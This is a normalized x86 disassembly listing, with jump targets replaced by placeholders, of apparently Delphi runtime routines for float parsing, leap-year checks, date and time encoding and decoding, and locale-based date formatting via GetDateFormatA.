mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4099a7
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4099b2
neg edx
mov ecx esi
call sub_4099b2
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4099a7
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4099ce
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ee4
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4099b2
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4099ce
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409a04
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_4093f0
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404210
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409a34
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_4093f0
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404210
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409a64
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4045e0
mov edx esp
xor ecx ecx
call sub_4098f0
test al al
jne r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] 0xb
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_408060
sub_409abc
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4045e0
mov edx esp
xor ecx ecx
call sub_4098f0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409ae8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4045e0
mov edx esp
xor ecx ecx
call sub_4098f0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409b30
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409b74
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409be4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409b74
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_408048
sub_409c24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409b30
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_40802c
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_40802c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_40802c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409c80
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409cbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409c80
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409d84
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409cbc
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_408048
sub_409db4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409b30
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_40802c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_40802c
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_40802c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409c80
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409f00
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409db4
pop esi
pop ecx
pop ebp
retn 0x8
sub_409f20
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409b30
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409f5c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4029b0
sub_409fa0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4043e0
mov edx eax
mov eax ebx
call sub_409f5c
pop ecx
pop ebx
pop ebp
retn
sub_409fc0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408ee0
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409f5c
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a00c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_40a038
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409f00
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40a070
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409c24
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40a0b0
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a1fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404120
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b8
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a205
lea eax [ ebp - 0x118 ]
call sub_404120
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404390
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4043e0
mov edx eax
mov eax [ ebx ]
call sub_40c67c
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c7f0
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404640
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c78c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404318
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c7f0
mov ecx eax
mov eax ebx
mov edx esi
call sub_404210
sub_40a218
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a2f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404120
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a2fd
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404390
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4043e0
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404640
sub_40a320
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40aaa1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aaa8
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_404144
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c870
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c850
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409f5c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c870
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409f5c
pop ecx
mov al [ eax + lookup_table_40a403 ]
jmp [ eax * 4 + jump_table_40a43c ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_40a00c
pop ecx
push ebp
call sub_40a038
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_40a00c
pop ecx
push ebp
call sub_40a038
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40a0b0
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409fa0
pop ecx
jmp r-xdata
push ebp
call sub_40a00c
pop ecx
push ebp
call sub_40a038
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40a218
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409fa0
pop ecx
jmp r-xdata
push ebp
call sub_40a00c
pop ecx
push ebp
call sub_40a038
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40a00c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40a00c
pop ecx
push ebp
call sub_40a070
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_40a00c
pop ecx
push ebp
call sub_40a070
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40a00c
pop ecx
push ebp
call sub_40a070
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40a00c
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_40a00c
pop ecx
push ebp
call sub_40a070
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40a070
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408d50
test eax eax
jne r-xdata
push ebp
call sub_40a00c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a320
pop ecx
push ebp
call sub_40a070
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409fc0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409fc0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409fc0
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_40a038
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409fc0
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409fc0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409fc0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a320
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a320
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409fc0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408d50
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409f5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a320
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409f5c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409f5c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f20
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408d50
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409f5c
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409f5c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f20
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c870
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408d50
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409f5c
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a320
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409fc0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408d50
test eax eax
jne r-xdata
push ebp
call sub_40a038
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f20
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409fa0
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409fa0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409fa0
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c870
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a320
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409f5c
pop ecx
jmp r-xdata
push ebp
call sub_40a038
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f20
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409fa0
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408d50
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408d50
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408d50
test eax eax
jne r-xdata
jmp r-xdata
sub_40aad4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a320
pop ecx
push ebp
mov eax ebx
call sub_40a320
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404210
